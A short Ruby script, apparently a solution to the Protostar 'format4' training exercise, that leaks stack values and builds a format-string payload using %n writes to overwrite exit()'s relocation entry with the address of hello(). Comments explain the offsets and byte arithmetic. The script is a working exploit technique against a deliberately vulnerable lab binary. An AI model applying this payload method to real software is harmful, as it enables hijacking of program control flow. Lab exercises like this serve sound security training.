#!/usr/bin/ruby

test = "ABCD" + "%08x|" * 20
command = "echo '#{test}' | /opt/protostar/bin/format4"
puts `#{command}`
# result: ABCD00000200|b7fd8420|bffff5e4|44434241|78383025|3830257c.....
# so %4$n will choose the fourth argument which is 44434241 and we can replace it with address of void hello()

# void hello(): 0x080484b4
# DYNAMIC RELOCATION RECORDS of exit(): 0x08049724

# what we need to write:
# 0x08049724 -> 0xb4 -> 180

# since the second hex to be written cannot be smaller than the first
# 0x08049725 -> 0x0484 -> 1156

# 0x08049727 -> 0x??08
# we don't care about the value in ??
# we just need to make the entire hex larger than the second
# i'll choose 0508 which is bigger than 0484
# 0x08049727 -> 0x0508 -> 1288

# sadly the \x27 will be parsed as single quotation
# this will confuse echo
# so i will use ruby -e instead
target = '\x24\x97\x04\x08' + '\x25\x97\x04\x08' + '\x27\x97\x04\x08'

# 180 = 168 + 12: because target is 12 bytes
h24 = "%168x" + "%4$n"
# 1156 = 976 + 180
h25 = "%976x" + "%5$n"
# 1288 = 1156 + 132
h27 = "%132x" + "%6$n"

command = <<-END
ruby -e 'puts "#{target}#{h24+h25+h27}"' | /opt/protostar/bin/format4
END

puts command

# you cannot use puts `#{command}` when command contains ruby -e
system(command)
